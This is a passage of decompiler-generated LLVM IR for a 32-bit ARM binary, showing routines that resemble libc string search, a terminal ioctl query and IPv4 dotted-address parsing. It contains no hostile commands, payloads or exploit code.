dec_label_pc_15760:                               ; preds = %dec_label_pc_15744, %dec_label_pc_1574c.preheader
  %v0_15760 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15764

dec_label_pc_15764:                               ; preds = %dec_label_pc_15738, %dec_label_pc_15760
  %storemerge = phi i32 [ %v2_1573c, %dec_label_pc_15738 ], [ %v0_15760, %dec_label_pc_15760 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15754, { 1, 0 }
  uselistorder i32 %v1_15748, { 1, 0 }
  uselistorder i32 %v1_15724, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1585c, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15764, { 1, 0 }
  uselistorder label %dec_label_pc_15744, { 1, 0 }
}

define i32 @function_15770(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15770:
  %v1_15774 = urem i32 %arg1, 256
  %v0_157942 = load i32, i32* @r0, align 4
  %v1_157943 = urem i32 %v0_157942, 4
  %v2_157944 = icmp eq i32 %v1_157943, 0
  br i1 %v2_157944, label %dec_label_pc_1579c, label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15770, %dec_label_pc_15790
  %v0_15790 = phi i32 [ %v1_15790, %dec_label_pc_15790 ], [ %v0_157942, %dec_label_pc_15770 ]
  %v1_1577c = inttoptr i32 %v0_15790 to i8*
  %v2_1577c = load i8, i8* %v1_1577c, align 1
  %v3_1577c = zext i8 %v2_1577c to i32
  %v9_15780 = icmp eq i32 %v3_1577c, %v1_15774
  br i1 %v9_15780, label %dec_label_pc_1584c, label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %dec_label_pc_1577c
  %v2_15788 = icmp eq i8 %v2_1577c, 0
  br i1 %v2_15788, label %dec_label_pc_1584c, label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %dec_label_pc_15788
  %v1_15790 = add i32 %v0_15790, 1
  %v1_15794 = urem i32 %v1_15790, 4
  %v2_15794 = icmp eq i32 %v1_15794, 0
  br i1 %v2_15794, label %dec_label_pc_1579c, label %dec_label_pc_1577c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15790, %dec_label_pc_15770
  %v0_157a0 = phi i32 [ %v0_157942, %dec_label_pc_15770 ], [ %v1_15790, %dec_label_pc_15790 ]
  %v4_1579c = mul nuw nsw i32 %v1_15774, 256
  %v5_1579c = or i32 %v4_1579c, %v1_15774
  %v4_157a4 = mul i32 %v5_1579c, 65536
  %v5_157a4 = or i32 %v4_157a4, %v5_1579c
  br label %dec_label_pc_157a8

dec_label_pc_157a8:                               ; preds = %dec_label_pc_15844, %dec_label_pc_157e4, %dec_label_pc_1579c
  %v0_1580c = phi i32 [ %v0_157a0, %dec_label_pc_1579c ], [ %v4_157a8, %dec_label_pc_157e4 ], [ %v4_157a8, %dec_label_pc_15844 ]
  %v1_157a8 = inttoptr i32 %v0_1580c to i32*
  %v2_157a8 = load i32, i32* %v1_157a8, align 4
  %v4_157a8 = add i32 %v0_1580c, 4
  %v2_157b0 = xor i32 %v2_157a8, %v5_157a4
  %v2_157b4 = add i32 %v2_157b0, 2130640639
  store i32 %v2_157b4, i32* @ip, align 4
  %v2_157bc = add i32 %v2_157a8, 2130640639
  %v1_157c0 = sub i32 -1, %v2_157a8
  %v2_157c4 = xor i32 %v2_157bc, %v1_157c0
  %v2_157d0 = and i32 %v2_157c4, -2130640640
  %v2_157d8 = icmp eq i32 %v2_157d0, 0
  br i1 %v2_157d8, label %dec_label_pc_157e4, label %dec_label_pc_157ec

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157a8
  %v1_157cc = sub i32 -1, %v2_157b0
  %v2_157d4 = xor i32 %v2_157b4, %v1_157cc
  %v2_157dc = and i32 %v2_157d4, -2130640640
  %v2_157e4 = icmp eq i32 %v2_157dc, 0
  br i1 %v2_157e4, label %dec_label_pc_157a8, label %dec_label_pc_157ec

dec_label_pc_157ec:                               ; preds = %dec_label_pc_157a8, %dec_label_pc_157e4
  %v2_157ec = inttoptr i32 %v0_1580c to i8*
  %v3_157ec = load i8, i8* %v2_157ec, align 1
  %v4_157ec = zext i8 %v3_157ec to i32
  %v9_157f0 = icmp eq i32 %v4_157ec, %v1_15774
  br i1 %v9_157f0, label %dec_label_pc_1584c, label %dec_label_pc_157fc

dec_label_pc_157fc:                               ; preds = %dec_label_pc_157ec
  %v2_157fc = icmp eq i8 %v3_157ec, 0
  br i1 %v2_157fc, label %dec_label_pc_1584c, label %dec_label_pc_15804

dec_label_pc_15804:                               ; preds = %dec_label_pc_157fc
  %v1_15804 = add i32 %v0_1580c, 1
  %v2_15804 = inttoptr i32 %v1_15804 to i8*
  %v3_15804 = load i8, i8* %v2_15804, align 1
  %v4_15804 = zext i8 %v3_15804 to i32
  %v9_15808 = icmp eq i32 %v4_15804, %v1_15774
  br i1 %v9_15808, label %dec_label_pc_1584c, label %dec_label_pc_15814

dec_label_pc_15814:                               ; preds = %dec_label_pc_15804
  %v2_15814 = icmp eq i8 %v3_15804, 0
  br i1 %v2_15814, label %dec_label_pc_1584c, label %dec_label_pc_1581c

dec_label_pc_1581c:                               ; preds = %dec_label_pc_15814
  %v1_1581c = add i32 %v0_1580c, 2
  %v2_1581c = inttoptr i32 %v1_1581c to i8*
  %v3_1581c = load i8, i8* %v2_1581c, align 1
  %v4_1581c = zext i8 %v3_1581c to i32
  %v9_15820 = icmp eq i32 %v4_1581c, %v1_15774
  br i1 %v9_15820, label %dec_label_pc_1584c, label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %dec_label_pc_1581c
  %v2_1582c = icmp eq i8 %v3_1581c, 0
  br i1 %v2_1582c, label %dec_label_pc_1584c, label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_1582c
  %v1_15834 = add i32 %v0_1580c, 3
  %v2_15834 = inttoptr i32 %v1_15834 to i8*
  %v3_15834 = load i8, i8* %v2_15834, align 1
  %v4_15834 = zext i8 %v3_15834 to i32
  %v9_15838 = icmp eq i32 %v4_15834, %v1_15774
  br i1 %v9_15838, label %dec_label_pc_1584c, label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15834
  %v2_15844 = icmp eq i8 %v3_15834, 0
  br i1 %v2_15844, label %dec_label_pc_1584c, label %dec_label_pc_157a8

dec_label_pc_1584c:                               ; preds = %dec_label_pc_15788, %dec_label_pc_1577c, %dec_label_pc_15844, %dec_label_pc_15834, %dec_label_pc_1582c, %dec_label_pc_1581c, %dec_label_pc_15814, %dec_label_pc_15804, %dec_label_pc_157fc, %dec_label_pc_157ec
  %v1_15850 = phi i32 [ %v1_15834, %dec_label_pc_15844 ], [ %v1_15834, %dec_label_pc_15834 ], [ %v1_1581c, %dec_label_pc_1582c ], [ %v1_1581c, %dec_label_pc_1581c ], [ %v1_15804, %dec_label_pc_15814 ], [ %v1_15804, %dec_label_pc_15804 ], [ %v0_1580c, %dec_label_pc_157fc ], [ %v0_1580c, %dec_label_pc_157ec ], [ %v0_15790, %dec_label_pc_1577c ], [ %v0_15790, %dec_label_pc_15788 ]
  ret i32 %v1_15850

; uselistorder directives
  uselistorder i32 %v4_157a8, { 1, 0 }
  uselistorder i32 %v2_157a8, { 0, 2, 1 }
  uselistorder i32 %v0_1580c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1579c, { 1, 0 }
  uselistorder i32 %v1_15790, { 1, 0, 2 }
  uselistorder i32 %v0_157942, { 2, 1, 0 }
  uselistorder i32 %v1_15774, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1584c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_157ec, { 1, 0 }
  uselistorder label %dec_label_pc_1577c, { 1, 0 }
}

define i32 @function_1585c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1585c:
  %v1_15860 = urem i32 %arg1, 256
  %v0_158803 = load i32, i32* @r0, align 4
  %v1_158804 = urem i32 %v0_158803, 4
  %v2_158805 = icmp eq i32 %v1_158804, 0
  br i1 %v2_158805, label %dec_label_pc_15888, label %dec_label_pc_15868

dec_label_pc_15868:                               ; preds = %dec_label_pc_1585c, %dec_label_pc_1587c
  %v0_1587c = phi i32 [ %v1_1587c, %dec_label_pc_1587c ], [ %v0_158803, %dec_label_pc_1585c ]
  %v1_15868 = inttoptr i32 %v0_1587c to i8*
  %v2_15868 = load i8, i8* %v1_15868, align 1
  %v3_15868 = zext i8 %v2_15868 to i32
  %v9_1586c = icmp eq i32 %v3_15868, %v1_15860
  br i1 %v9_1586c, label %dec_label_pc_1593c, label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %dec_label_pc_15868
  %v2_15874 = icmp eq i8 %v2_15868, 0
  br i1 %v2_15874, label %dec_label_pc_15938, label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %dec_label_pc_15874
  %v1_1587c = add i32 %v0_1587c, 1
  %v1_15880 = urem i32 %v1_1587c, 4
  %v2_15880 = icmp eq i32 %v1_15880, 0
  br i1 %v2_15880, label %dec_label_pc_15888, label %dec_label_pc_15868

dec_label_pc_15888:                               ; preds = %dec_label_pc_1587c, %dec_label_pc_1585c
  %v0_1588c = phi i32 [ %v0_158803, %dec_label_pc_1585c ], [ %v1_1587c, %dec_label_pc_1587c ]
  %v4_15888 = mul nuw nsw i32 %v1_15860, 256
  %v5_15888 = or i32 %v4_15888, %v1_15860
  %v4_15890 = mul i32 %v5_15888, 65536
  %v5_15890 = or i32 %v4_15890, %v5_15888
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %dec_label_pc_15930, %dec_label_pc_158d0, %dec_label_pc_15888
  %v0_158f8 = phi i32 [ %v0_1588c, %dec_label_pc_15888 ], [ %v4_15894, %dec_label_pc_158d0 ], [ %v4_15894, %dec_label_pc_15930 ]
  %v1_15894 = inttoptr i32 %v0_158f8 to i32*
  %v2_15894 = load i32, i32* %v1_15894, align 4
  %v4_15894 = add i32 %v0_158f8, 4
  %v2_1589c = xor i32 %v2_15894, %v5_15890
  %v2_158a0 = add i32 %v2_1589c, 2130640639
  store i32 %v2_158a0, i32* @ip, align 4
  %v2_158a8 = add i32 %v2_15894, 2130640639
  %v1_158ac = sub i32 -1, %v2_15894
  %v2_158b0 = xor i32 %v2_158a8, %v1_158ac
  %v2_158bc = and i32 %v2_158b0, -2130640640
  %v2_158c4 = icmp eq i32 %v2_158bc, 0
  br i1 %v2_158c4, label %dec_label_pc_158d0, label %dec_label_pc_158d8

dec_label_pc_158d0:                               ; preds = %dec_label_pc_15894
  %v1_158b8 = sub i32 -1, %v2_1589c
  %v2_158c0 = xor i32 %v2_158a0, %v1_158b8
  %v2_158c8 = and i32 %v2_158c0, -2130640640
  %v2_158d0 = icmp eq i32 %v2_158c8, 0
  br i1 %v2_158d0, label %dec_label_pc_15894, label %dec_label_pc_158d8

dec_label_pc_158d8:                               ; preds = %dec_label_pc_15894, %dec_label_pc_158d0
  %v2_158d8 = inttoptr i32 %v0_158f8 to i8*
  %v3_158d8 = load i8, i8* %v2_158d8, align 1
  %v4_158d8 = zext i8 %v3_158d8 to i32
  %v9_158dc = icmp eq i32 %v4_158d8, %v1_15860
  br i1 %v9_158dc, label %dec_label_pc_1593c, label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158d8
  %v2_158e8 = icmp eq i8 %v3_158d8, 0
  br i1 %v2_158e8, label %dec_label_pc_15938, label %dec_label_pc_158f0

dec_label_pc_158f0:                               ; preds = %dec_label_pc_158e8
  %v1_158f0 = add i32 %v0_158f8, 1
  %v2_158f0 = inttoptr i32 %v1_158f0 to i8*
  %v3_158f0 = load i8, i8* %v2_158f0, align 1
  %v4_158f0 = zext i8 %v3_158f0 to i32
  %v9_158f4 = icmp eq i32 %v4_158f0, %v1_15860
  br i1 %v9_158f4, label %dec_label_pc_1593c, label %dec_label_pc_15900

dec_label_pc_15900:                               ; preds = %dec_label_pc_158f0
  %v2_15900 = icmp eq i8 %v3_158f0, 0
  br i1 %v2_15900, label %dec_label_pc_15938, label %dec_label_pc_15908

dec_label_pc_15908:                               ; preds = %dec_label_pc_15900
  %v1_15908 = add i32 %v0_158f8, 2
  %v2_15908 = inttoptr i32 %v1_15908 to i8*
  %v3_15908 = load i8, i8* %v2_15908, align 1
  %v4_15908 = zext i8 %v3_15908 to i32
  %v9_1590c = icmp eq i32 %v4_15908, %v1_15860
  br i1 %v9_1590c, label %dec_label_pc_1593c, label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %dec_label_pc_15908
  %v2_15918 = icmp eq i8 %v3_15908, 0
  br i1 %v2_15918, label %dec_label_pc_15938, label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_15918
  %v1_15920 = add i32 %v0_158f8, 3
  %v2_15920 = inttoptr i32 %v1_15920 to i8*
  %v3_15920 = load i8, i8* %v2_15920, align 1
  %v4_15920 = zext i8 %v3_15920 to i32
  %v9_15924 = icmp eq i32 %v4_15920, %v1_15860
  br i1 %v9_15924, label %dec_label_pc_1593c, label %dec_label_pc_15930

dec_label_pc_15930:                               ; preds = %dec_label_pc_15920
  %v2_15930 = icmp eq i8 %v3_15920, 0
  br i1 %v2_15930, label %dec_label_pc_15938, label %dec_label_pc_15894

dec_label_pc_15938:                               ; preds = %dec_label_pc_15874, %dec_label_pc_15930, %dec_label_pc_15918, %dec_label_pc_15900, %dec_label_pc_158e8
  br label %dec_label_pc_1593c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_15868, %dec_label_pc_15920, %dec_label_pc_15908, %dec_label_pc_158f0, %dec_label_pc_158d8, %dec_label_pc_15938
  %v1_15940 = phi i32 [ 0, %dec_label_pc_15938 ], [ %v1_15920, %dec_label_pc_15920 ], [ %v1_15908, %dec_label_pc_15908 ], [ %v1_158f0, %dec_label_pc_158f0 ], [ %v0_158f8, %dec_label_pc_158d8 ], [ %v0_1587c, %dec_label_pc_15868 ]
  ret i32 %v1_15940

; uselistorder directives
  uselistorder i32 %v4_15894, { 1, 0 }
  uselistorder i32 %v2_15894, { 0, 2, 1 }
  uselistorder i32 %v0_158f8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15888, { 1, 0 }
  uselistorder i32 %v1_1587c, { 1, 0, 2 }
  uselistorder i32 %v0_158803, { 2, 1, 0 }
  uselistorder i32 %v1_15860, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 3, 4, 1, 5, 64, 65, 112, 66, 67, 68, 69, 70, 71, 73, 74, 113, 7, 108, 29, 109, 28, 110, 42, 111, 72, 30, 75, 76, 2, 77, 78, 79, 43, 8, 80, 31, 81, 44, 82, 45, 83, 46, 32, 47, 48, 49, 50, 51, 0, 84, 85, 86, 10, 9, 52, 87, 33, 88, 12, 11, 53, 89, 34, 90, 55, 91, 14, 13, 54, 92, 35, 93, 57, 94, 16, 15, 56, 95, 36, 96, 58, 18, 17, 59, 98, 37, 99, 20, 19, 60, 38, 100, 22, 21, 61, 101, 39, 102, 24, 23, 62, 103, 40, 104, 26, 25, 63, 105, 41, 106, 27, 107, 6, 97 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 142, 146, 141, 147, 26, 27, 28, 29, 30, 31, 32, 33, 140, 34, 35, 36, 2, 37, 0, 3, 38, 39, 41, 40, 1, 44, 42, 43, 45, 143, 47, 46, 50, 51, 52, 48, 49, 53, 54, 56, 57, 58, 55, 59, 144, 60, 62, 61, 64, 63, 65, 145, 66, 68, 67, 70, 69, 75, 71, 76, 72, 77, 73, 74, 78, 79, 80, 81, 83, 84, 82, 139, 86, 85, 89, 90, 91, 87, 88, 92, 99, 93, 100, 94, 101, 95, 102, 96, 103, 97, 98, 105, 104, 106, 107, 108, 109, 114, 110, 115, 111, 116, 112, 113, 118, 117, 119, 120, 121, 124, 122, 125, 123, 126, 127, 128, 129, 130, 132, 133, 131, 134, 136, 137, 135, 138 }
  uselistorder label %dec_label_pc_1593c, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15938, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_158d8, { 1, 0 }
  uselistorder label %dec_label_pc_15868, { 1, 0 }
}

define i32 @function_1594c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1594c:
  %stack_var_-68 = alloca i32, align 4
  %v2_15954 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15954, i32* @r1, align 4
  %v0_15958 = call i32 @function_15970()
  %v1_1595c = sub i32 1, %v0_15958
  %v2_1595c = icmp ult i32 %v0_15958, 2
  br i1 %v2_1595c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_1594c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_1594c, %bb
  %v1_1596c = phi i32 [ %v1_1595c, %dec_label_pc_1594c ], [ 0, %bb ]
  ret i32 %v1_1596c

; uselistorder directives
  uselistorder i32 %v0_15958, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15970() local_unnamed_addr {
dec_label_pc_15970:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15970 = load i32, i32* @r4, align 4
  %v6_15970 = load i32, i32* @r5, align 4
  %v2_15978 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1597c = load i32, i32* @r1, align 4
  store i32 %v0_1597c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_15988 = load i32, i32* @r0, align 4
  %v3_15988 = call i32 @function_10b54(i32 %v0_15988, i32 21505, i32 %v2_15978)
  store i32 %v3_15988, i32* %r0.global-to-local, align 4
  store i32 %v3_15988, i32* @r5, align 4
  %v2_1598c = icmp eq i32 %v3_15988, 0
  br i1 %v2_1598c, label %dec_label_pc_15994, label %dec_label_pc_159d8

dec_label_pc_15994:                               ; preds = %dec_label_pc_15970
  %v4_159a0 = zext i8 %tmp to i32
  store i32 %v4_159a0, i32* @ip, align 4
  %v3_159a4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_159a4, i32* @r3, align 4
  %v1_159a8 = load i32, i32* @r4, align 4
  %v2_159a8 = add i32 %v1_159a8, 4
  %v3_159a8 = inttoptr i32 %v2_159a8 to i32*
  %v0_159ac = load i32, i32* %r1.global-to-local, align 4
  %v1_159ac = load i32, i32* @r4, align 4
  %v2_159ac = add i32 %v1_159ac, 8
  %v3_159ac = inttoptr i32 %v2_159ac to i32*
  store i32 %v0_159ac, i32* %v3_159ac, align 4
  %v0_159b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_159b0 = load i32, i32* @r4, align 4
  %v2_159b0 = add i32 %v1_159b0, 12
  %v3_159b0 = inttoptr i32 %v2_159b0 to i32*
  store i32 %v0_159b0, i32* %v3_159b0, align 4
  %v2_159b4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_159b4, i32* @r1, align 4
  %v1_159bc = load i32, i32* @r4, align 4
  %v2_159bc = inttoptr i32 %v1_159bc to i32*
  store i32 %v3_159a4, i32* %v2_159bc, align 4
  %v0_159c0 = load i32, i32* @ip, align 4
  %v1_159c0 = trunc i32 %v0_159c0 to i8
  %v2_159c0 = load i32, i32* @r4, align 4
  %v3_159c0 = add i32 %v2_159c0, 16
  %v4_159c0 = inttoptr i32 %v3_159c0 to i8*
  store i8 %v1_159c0, i8* %v4_159c0, align 1
  %v0_159c4 = load i32, i32* @r4, align 4
  %v1_159c4 = add i32 %v0_159c4, 17
  store i32 %v1_159c4, i32* %r0.global-to-local, align 4
  %v4_159c8 = call i32 @function_15eb4(i32 %v1_159c4, i32 %v2_159b4, i32 19, i32 %v3_159a4)
  store i32 %v4_159c8, i32* %r0.global-to-local, align 4
  %v0_159cc = load i32, i32* @r5, align 4
  store i32 %v0_159cc, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_159d4 = inttoptr i32 %v4_159c8 to i8*
  %v3_159d4 = call i32 @function_11060(i8* %v2_159d4, i32 %v0_159cc)
  store i32 %v3_159d4, i32* %r0.global-to-local, align 4
  %v0_159d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_159d8

dec_label_pc_159d8:                               ; preds = %dec_label_pc_15970, %dec_label_pc_15994
  %v0_159d8 = phi i32 [ %v3_15988, %dec_label_pc_15970 ], [ %v0_159d8.pre, %dec_label_pc_15994 ]
  store i32 %v0_159d8, i32* %r0.global-to-local, align 4
  store i32 %v3_15970, i32* @r4, align 4
  store i32 %v6_15970, i32* @r5, align 4
  ret i32 %v0_159d8

; uselistorder directives
  uselistorder i32 %v0_159d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i8*, i32)* @function_11060, { 2, 3, 4, 8, 0, 1, 11, 10, 9, 5, 6, 7 }
  uselistorder i32 13, { 25, 24, 0, 1, 27, 28, 26, 29, 30, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 3, 16, 17, 18, 19, 20, 21, 31, 32, 33, 34, 35, 36, 37, 22, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 23, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 5, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 6, 68, 69 }
  uselistorder i32 17, { 15, 1, 4, 5, 16, 6, 17, 7, 8, 9, 10, 2, 18, 3, 19, 20, 11, 21, 12, 22, 23, 24, 0, 25, 13, 26, 14 }
  uselistorder i32 (i32, i32, i32)* @function_10b54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159d8, { 1, 0 }
}

define i32 @function_159ec() local_unnamed_addr {
dec_label_pc_159ec:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_159ec = load i32, i32* @r4, align 4
  store i32 %v3_159ec, i32* %stack_var_-28, align 4
  %v0_159f4 = load i32, i32* @r0, align 4
  %v2_159f4 = icmp eq i32 %v0_159f4, 0
  %v0_159fc = load i32, i32* @r1, align 4
  br i1 %v2_159f4, label %dec_label_pc_15ad0, label %dec_label_pc_15a04

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159ec
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_15a04, %dec_label_pc_15a94
  %v1_15a94 = phi i32 [ 0, %dec_label_pc_15a04 ], [ %v5_15a94, %dec_label_pc_15a94 ]
  %v0_15a98 = phi i32 [ 1, %dec_label_pc_15a04 ], [ %v1_15a98, %dec_label_pc_15a94 ]
  %v0_15a1c = phi i32 [ %v0_159f4, %dec_label_pc_15a04 ], [ %v0_15a1c12, %dec_label_pc_15a94 ]
  %v1_15a1c = inttoptr i32 %v0_15a1c to i8*
  %v2_15a1c = load i8, i8* %v1_15a1c, align 1
  %v3_15a1c = zext i8 %v2_15a1c to i32
  %v4_15a20 = load i32, i32* inttoptr (i32 124312 to i32*), align 8
  %v2_15a24 = mul nuw nsw i32 %v3_15a1c, 2
  %v2_15a28 = add i32 %v2_15a24, %v4_15a20
  %v3_15a28 = inttoptr i32 %v2_15a28 to i16*
  %v4_15a28 = load i16, i16* %v3_15a28, align 2
  %v1_15a2c = and i16 %v4_15a28, 8
  %v2_15a2c = icmp eq i16 %v1_15a2c, 0
  br i1 %v2_15a2c, label %dec_label_pc_15ad0, label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a1c
  br label %dec_label_pc_15a54

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a54
  %v2_15a3c = mul i32 %v0_15a94, 10
  %v1_15a40 = add i32 %v2_15a3c, -48
  %v2_15a44 = add i32 %v3_15a54, %v1_15a40
  %v8_15a4c = icmp sgt i32 %v2_15a44, 255
  br i1 %v8_15a4c, label %dec_label_pc_15ad0, label %dec_label_pc_15a50

dec_label_pc_15a50:                               ; preds = %dec_label_pc_15a3c
  %v1_15a50 = add i32 %v0_15a84, 1
  store i32 %v1_15a50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a54

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a34, %dec_label_pc_15a50
  %v0_15a94 = phi i32 [ 0, %dec_label_pc_15a34 ], [ %v2_15a44, %dec_label_pc_15a50 ]
  %v0_15a84 = phi i32 [ %v0_15a1c, %dec_label_pc_15a34 ], [ %v1_15a50, %dec_label_pc_15a50 ]
  %v1_15a54 = inttoptr i32 %v0_15a84 to i8*
  %v2_15a54 = load i8, i8* %v1_15a54, align 1
  %v3_15a54 = zext i8 %v2_15a54 to i32
  %v2_15a58 = mul nuw nsw i32 %v3_15a54, 2
  %v2_15a5c = add i32 %v2_15a58, %v4_15a20
  %v3_15a5c = inttoptr i32 %v2_15a5c to i16*
  %v4_15a5c = load i16, i16* %v3_15a5c, align 2
  %v6_15a5c = zext i16 %v4_15a5c to i32
  %v1_15a60 = and i32 %v6_15a5c, 8
  %v2_15a60 = icmp eq i32 %v1_15a60, 0
  br i1 %v2_15a60, label %dec_label_pc_15a68, label %dec_label_pc_15a3c

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15a54
  %v7_15a68 = icmp eq i32 %v0_15a98, 4
  br i1 %v7_15a68, label %dec_label_pc_15a80, label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a68
  %v7_15a70 = icmp eq i8 %v2_15a54, 46
  br i1 %v7_15a70, label %dec_label_pc_15a78, label %dec_label_pc_15ad0

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a70
  %v1_15a78 = add i32 %v0_15a84, 1
  store i32 %v1_15a78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a94

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a68
  %v2_15a80 = icmp eq i8 %v2_15a54, 0
  %v1_15a84 = add i32 %v0_15a84, 1
  store i32 %v1_15a84, i32* %r0.global-to-local, align 4
  br i1 %v2_15a80, label %dec_label_pc_15a94, label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a80
  %v1_15a8c = and i32 %v6_15a5c, 32
  %v2_15a8c = icmp eq i32 %v1_15a8c, 0
  br i1 %v2_15a8c, label %dec_label_pc_15ad0, label %dec_label_pc_15a94

dec_label_pc_15a94:                               ; preds = %dec_label_pc_15a8c, %dec_label_pc_15a80, %dec_label_pc_15a78
  %v0_15a1c12 = phi i32 [ %v1_15a84, %dec_label_pc_15a8c ], [ %v1_15a84, %dec_label_pc_15a80 ], [ %v1_15a78, %dec_label_pc_15a78 ]
  %v4_15a94 = mul i32 %v1_15a94, 256
  %v5_15a94 = or i32 %v0_15a94, %v4_15a94
  %v1_15a98 = add nuw nsw i32 %v0_15a98, 1
  %v7_15aa0 = icmp slt i32 %v1_15a98, 5
  br i1 %v7_15aa0, label %dec_label_pc_15a1c, label %dec_label_pc_15aa4

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a94
  %v2_15aa4 = icmp eq i32 %v0_159fc, 0
  br i1 %v2_15aa4, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_15aa4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ad4

bb:                                               ; preds = %dec_label_pc_15aa4
  %v4_15aa8 = udiv i32 %v5_15a94, 16777216
  %v2_15aac = udiv i32 %v5_15a94, 256
  %v5_15ab0 = and i32 %v2_15aac, 65280
  %v2_15ab4 = and i32 %v5_15a94, 65280
  %v5_15ab8 = mul nuw nsw i32 %v2_15ab4, 256
  %v5_15abc = mul i32 %v0_15a94, 16777216
  %v6_15ab0 = or i32 %v4_15aa8, %v5_15abc
  %v6_15ab8 = or i32 %v6_15ab0, %v5_15ab0
  %v6_15abc = or i32 %v6_15ab8, %v5_15ab8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15ac8 = inttoptr i32 %v0_159fc to i32*
  store i32 %v6_15abc, i32* %v3_15ac8, align 4
  %v2_15ad4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_15ad8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15a8c, %dec_label_pc_15a1c, %dec_label_pc_15a3c, %dec_label_pc_159ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_15ad0
  %v1_15ad8 = phi i32 [ %v1_15ad8.pre, %bb ], [ 0, %dec_label_pc_15ad0 ], [ 1, %.thread7.thread ]
  %v2_15ad4 = phi i32 [ %v2_15ad4.pre, %bb ], [ %v3_159ec, %dec_label_pc_15ad0 ], [ %v3_159ec, %.thread7.thread ]
  store i32 %v2_15ad4, i32* @r4, align 4
  ret i32 %v1_15ad8

; uselistorder directives
  uselistorder i32 %v1_15a98, { 1, 0 }
  uselistorder i32 %v5_15a94, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15a84, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
